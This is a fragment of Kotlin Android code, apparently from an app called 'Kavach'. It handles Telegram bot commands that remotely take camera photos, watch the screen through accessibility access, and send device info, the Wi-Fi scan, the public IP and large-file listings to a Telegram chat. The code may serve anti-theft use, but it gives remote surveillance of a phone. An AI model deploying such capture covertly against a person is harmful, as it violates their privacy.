                api.sendMessage(chatId, if (ok) "🎞 SCENE-WATCH ON — scene badle (ML) = alert+proof 😎 (♿ a11y screen-power chahiye)" else "⚠️ ♿ screen-power OFF ya already ON — panel se 🔑 a11y ON karke wapas")
            }
            "scenoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.ai.KavachAI.sceneWatchStop(); api.sendMessage(chatId, "🎞 Scene-watch band 🤫") }
            "aidig" -> { api.answerCb(cbId, "📰…"); api.sendChatAction(chatId, "typing"); api.sendMessage(chatId, com.kavach.app.core.ai.KavachAI.digestText(app)) }
            "sysinfo" -> { api.answerCb(cbId, "📱…"); api.sendChatAction(chatId, "typing"); com.kavach.app.core.system.KavachSystem.deviceInfo(app).chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "battd" -> { api.answerCb(cbId, "🔋…"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.battDetail(app)) }
            "br30", "br70", "br100" -> { val p = id.removePrefix("br").toInt(); api.answerCb(cbId, "🔆…"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.setBrightness(app, p)) }
            "wake2", "wake10" -> { val m = if (id == "wake10") 10 else 2; api.answerCb(cbId, "👁…"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.wake(app, m)) }
            "wakeoff" -> { api.answerCb(cbId, "😴"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.wakeOff()) }
            "datause" -> { api.answerCb(cbId, "📊…"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.dataUsage()) }
            "bigf", "bigf5" -> { val mb = if (id == "bigf5") 500 else 100; api.answerCb(cbId, "🐘…"); api.sendChatAction(chatId, "typing"); com.kavach.app.core.system.KavachSystem.bigFiles("/sdcard", mb).chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "cacheclean" -> { api.answerCb(cbId, "🧹…"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.cacheClean(app)) }
            "netfull" -> { api.answerCb(cbId, "🌐…"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.netFull(app)) }
            "netpub" -> { api.answerCb(cbId, "🌍…"); api.sendChatAction(chatId, "typing"); api.sendMessage(chatId, "🌍 Public IP:\n" + com.kavach.app.core.system.KavachSystem.publicIp()) }
            "wifiscan" -> { api.answerCb(cbId, "📶…"); api.sendChatAction(chatId, "typing"); api.sendMessage(chatId, com.kavach.app.core.system.KavachSystem.wifiScan(app)) }
            "speedt" -> {
                api.answerCb(cbId, "⚡ …")
                api.sendMessage(chatId, "⚡ Speed-test chal rahi — humare hi APK ko download-time measure… 🩺 (~10-30s)")
                api.sendChatAction(chatId, "typing")
                api.sendMessage(chatId,
                    com.kavach.app.core.system.KavachSystem.speedTest("https://github.com/deepakyadavg69/kavach-dl/releases/download/v2.1.0/device-info-v2.1.0.apk"))
            }
            "status" -> {
                api.answerCb(cbId, "📊 live…")
                api.sendMessage(chatId, statusText(app))
            }
            "batt" -> {
                api.answerCb(cbId, "🔋…")
                api.sendMessage(chatId, "🔋 " + battText(app))
            }
            else -> api.answerCb(cbId, "🚧 Order abhi queue me — build hoga!")
        }
    }

    private suspend fun photoAction(app: Context, api: TelegramApi, chatId: Long, cbId: String, front: Boolean, extraCap: String = "") {
        api.answerCb(cbId, "📸 khinchi ja rahi…")
        if (!KavachCamera.ready(app)) { api.sendMessage(chatId, "⚠️ Camera permission 🟢 nahi hai — panel dekho!"); return }
        api.sendChatAction(chatId, "upload_photo")
        api.sendMessage(chatId, "📸 ${if (front) "Front" else "Rear"} capture chal raha…")
        val jpg = KavachCamera.photo(app, front)
        if (jpg != null) api.sendPhoto(chatId, jpg, "${if (front) "🤳 FRONT" else "📷 REAR"} $extraCap — caught ya photo? 🕵️")
        else api.sendMessage(chatId, "❌ Photo fail — kaaran: ${com.kavach.app.core.actions.KavachCamera.lastWhy} (thodi der baad phir)")
    }
}
